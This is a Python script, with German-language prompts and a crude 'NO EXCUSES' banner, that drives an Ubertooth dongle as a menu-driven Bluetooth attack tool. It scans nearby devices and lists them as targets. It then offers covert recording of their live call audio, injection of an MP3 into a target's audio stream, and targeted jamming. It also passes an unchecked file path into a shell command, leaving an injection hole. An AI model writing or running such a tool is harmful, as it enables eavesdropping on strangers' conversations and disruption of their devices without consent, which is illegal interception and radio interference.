#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH AUTO-DO-IT-ALL v666 - NO EXCUSES EDITION

import os
import sys
import re
import time
import usb.core
import signal
import subprocess
from datetime import datetime
import colorama
from colorama import Fore, Style

# Initialisierung
colorama.init()
os.system('clear')

class UberCommander:
    def __init__(self):
        self.targets = []
        self.attacks = []
        self.running = True
        signal.signal(signal.SIGINT, self.kill_all)
        
        # Hardware-Check
        if not self.check_ubertooth():
            print(f"{Fore.RED}🚨 KEIN UBERTOOTH! Steck ihn ein oder verpiss dich.{Style.RESET_ALL}")
            sys.exit(1)
        
        self.main_loop()

    def check_ubertooth(self):
        """Brutaler Hardware-Check"""
        dev = usb.core.find(idVendor=0x1D50, idProduct=0x6002)
        return dev is not None

    def kill_all(self, sig=None, frame=None):
        """Tötet alles was bluetoothig ist"""
        print(f"\n{Fore.RED}☠️ TÖTE ALLE PROZESSE...{Style.RESET_ALL}")
        os.system("pkill -9 -f 'ubertooth|hcidump|btmon' >/dev/null 2>&1")
        sys.exit(0)

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH AUTO-DO-IT-ALL v666
   • Kein Gerede • Einfach Machen •
 ------------------------------------
{Style.RESET_ALL}""")

    def scan_targets(self):
        """Scannt und zeigt Ziele an"""
        self.show_banner()
        print(f"{Fore.CYAN}🔍 Scanne 15 Sekunden... (Bleib ruhig){Style.RESET_ALL}")
        
        result = subprocess.run(["ubertooth-scan", "-t", "15"], 
                              capture_output=True, text=True)
        
        self.targets = []
        for line in result.stdout.split('\n'):
            if 'BD_ADDR' in line:
                bd_addr = re.search(r'(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
                if bd_addr:
                    self.targets.append(bd_addr.group(1))
        
        if not self.targets:
            print(f"{Fore.RED}Keine Ziele gefunden! Versuchs nochmal.{Style.RESET_ALL}")
            return False
        return True

    def attack_target(self, target):
        """All-in-One Angriffsmenü"""
        while True:
            self.show_banner()
            print(f"\n{Fore.RED}🎯 AKTIVES ZIEL: {target}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}1. Live Audio abhören + aufnehmen{Style.RESET_ALL}")
            print(f"{Fore.GREEN}2. Audio-Injection (MP3){Style.RESET_ALL}")
            print(f"{Fore.RED}3. Jamming starten{Style.RESET_ALL}")
            print(f"{Fore.BLUE}4. Zurück{Style.RESET_ALL}")
            
            choice = input("\nWAS WILLST DU? ")
            
            if choice == "1":
                self.capture_audio(target)
            elif choice == "2":
                self.inject_audio(target)
            elif choice == "3":
                self.jam_target(target)
            elif choice == "4":
                break
            else:
                print(f"{Fore.RED}🤷 WAS SOLL DAS? NOCHMAL!{Style.RESET_ALL}")

    def capture_audio(self, target):
        """SCO Audio capture"""
        filename = f"audio_{target.replace(':', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        print(f"{Fore.RED}🎙️ STARTE ABHÖREN... (Stop mit Enter){Style.RESET_ALL}")
        proc = subprocess.Popen(f"ubertooth-bt -S -t {target} -c {filename}",
                              shell=True,
                              preexec_fn=os.setsid)
        input()
        proc.kill()
        print(f"{Fore.GREEN}✔ Aufnahme gespeichert: {filename}{Style.RESET_ALL}")

    def inject_audio(self, target):
        """Spielt MP3 auf Zielgerät"""
        mp3 = input("Pfad zur MP3-Datei: ").strip()
        if not os.path.exists(mp3):
            print(f"{Fore.RED}Datei existiert nicht!{Style.RESET_ALL}")
            return
            
        print(f"{Fore.RED}🔊 Konvertiere MP3...{Style.RESET_ALL}")
        os.system(f"sox '{mp3}' -r 8000 -c 1 -b 16 -e signed-integer /tmp/inject.raw")
        
        print(f"{Fore.RED}⚡ Spiele Audio auf {target}... (Stop mit Enter){Style.RESET_ALL}")
        proc = subprocess.Popen(f"cat /tmp/inject.raw | hstest /dev/stdin",
                              shell=True,
                              preexec_fn=os.setsid)
        input()
        proc.kill()

    def jam_target(self, target):
        """Jammt gezielt ein Gerät"""
        print(f"{Fore.RED}📶 JAMME {target}... (Stop mit Enter){Style.RESET_ALL}")
        proc = subprocess.Popen(f"ubertooth-jam -b -t {target}",
                              shell=True,
                              preexec_fn=os.setsid)
        input()
        proc.kill()

    def main_loop(self):
        """Hauptsteuerung"""
        while self.running:
            if not self.targets:
                if not self.scan_targets():
                    time.sleep(2)
                    continue
            
            self.show_banner()
            print(f"\n{Fore.GREEN}=== GEFUNDENE ZIELE ==={Style.RESET_ALL}")
            for i, target in enumerate(self.targets, 1):
                print(f"{i}. {target}")
            print(f"\n{Fore.YELLOW}X. Neu scannen{Style.RESET_ALL}")
            print(f"{Fore.RED}Q. Beenden{Style.RESET_ALL}")
            
            choice = input("\nWÄHLE ZIEL (1-9/X/Q): ").upper()
            
            if choice == "X":
                self.targets = []
            elif choice == "Q":
                self.running = False
            elif choice.isdigit() and 1 <= int(choice) <= len(self.targets):
                self.attack_target(self.targets[int(choice)-1])
            else:
                print(f"{Fore.RED}🤦 UNGÜLTIG! NOCHMAL!{Style.RESET_ALL}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}🚫 NUR MIT SUDO! (sudo {sys.argv[0]}){Style.RESET_ALL}")
        sys.exit(1)
    
    # Check dependencies
    missing = []
    for cmd in ['ubertooth-scan', 'sox', 'hstest']:
        if not subprocess.getoutput(f"which {cmd}"):
            missing.append(cmd)
    if missing:
        print(f"{Fore.RED}FEHLENDE TOOLS: {', '.join(missing)}{Style.RESET_ALL}")
        sys.exit(1)
    
    UberCommander()
